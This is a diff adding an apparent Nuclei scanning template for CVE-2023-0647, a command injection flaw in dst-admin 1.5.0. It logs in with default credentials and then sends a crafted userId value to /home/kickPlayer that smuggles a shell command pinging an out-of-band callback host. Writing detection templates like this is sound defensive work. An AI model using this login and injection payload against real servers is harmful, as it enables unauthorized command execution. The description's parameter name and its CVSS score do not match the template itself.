@@ -1,0 +1,46 @@
+id: cve-2023-0647
+info:
+  name: dst-admin kickPlayer RCE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    There is a command injection vulnerability in dst-admin version 1.5.0. Exploitation occurs via the 'command' parameter in the /home/kickPlayer endpoint, allowing attackers to execute arbitrary commands on the server.
+  reference:
+    - https://github.com/Ha0Liu/cveAdd/blob/developer/dst-admin%201.5.0%E5%90%8E%E5%8F%B0kickPlayer%E6%8E%A5%E5%8F%A3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Dst-admin%201.5.0%20background%20kickPlayer%20interface%20remote%20command%20execution.md
+  tags: command_injection, rce
+  classification:
+    cve-id: CVE-2023-0647
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 7.5
+http:
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=123456
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "登陆成功"
+    extractors:
+      - type: regex
+        part: header
+        name: session_cookie
+        regex:
+          - "Set-Cookie: (.+?);"
+        internal: true
+  - raw:
+      - |
+        GET /home/kickPlayer?userId=%5C%22)%5Cn%22%26ping%20{{interactsh-url}}%26screen%20-S%20%22DST_CAVES%22%20-p%200%20-X%20stuff%20%22TheNet%3AKick(%5C%22 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{session_cookie}}
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
